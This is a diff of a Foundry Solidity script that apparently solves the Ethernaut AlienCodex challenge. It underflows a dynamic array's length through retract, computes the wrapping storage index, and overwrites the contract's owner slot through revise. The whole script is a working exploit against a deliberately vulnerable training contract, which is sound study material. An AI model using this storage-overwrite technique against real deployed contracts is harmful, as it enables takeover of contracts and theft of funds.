@@ -5,7 +5,7 @@ import "forge-std/Script.sol";
 
 interface IAlienCodex {
     function contact() external view returns (bool);
-    function make_contact() external;
+    function makeContact() external;
     function retract() external;
     function revise(uint i, bytes32 _content) external;
     function owner() external view returns (address);
@@ -14,26 +14,25 @@ interface IAlienCodex {
 contract AlienCodexSolution is Script {
     function run() external {
         uint deployerPrivateKey = vm.envUint("PRIVATE_KEY");
-        address alienCodexAddress = 0x9A5589128908441ae5181953193Ca6585F43C3D5;
+        address alienCodexAddress = 0xc66651C4AF7a329d9C2DA2EE82BDf055d9Cf24AF;
 
         vm.startBroadcast(deployerPrivateKey);
 
         IAlienCodex alien = IAlienCodex(alienCodexAddress);
 
-        // Only call make_contact if contact is false
-        if (!alien.contact()) {
-            alien.make_contact();
-        }
+        // Step 1: Make contact
+        alien.makeContact();
 
-        // Trigger array underflow
+        // Step 2: Trigger array underflow
         alien.retract();
 
-        // Compute index to overwrite owner
-        uint256 arraySlot = uint256(keccak256(abi.encode(uint256(2))));
+        // Step 3: Compute index to overwrite owner
+        uint256 arraySlot = uint256(keccak256(abi.encode(uint256(1))));
         uint256 index = type(uint256).max - arraySlot + 1;
 
-        // Overwrite owner with our address
-        alien.revise(index, bytes32(uint256(uint160(msg.sender))));
+        // Step 4: Overwrite owner with our address
+        bytes32 newOwner = bytes32(uint256(uint160(vm.addr(deployerPrivateKey))));
+        alien.revise(index, newOwner);
 
         console.log("New owner:", alien.owner());
 
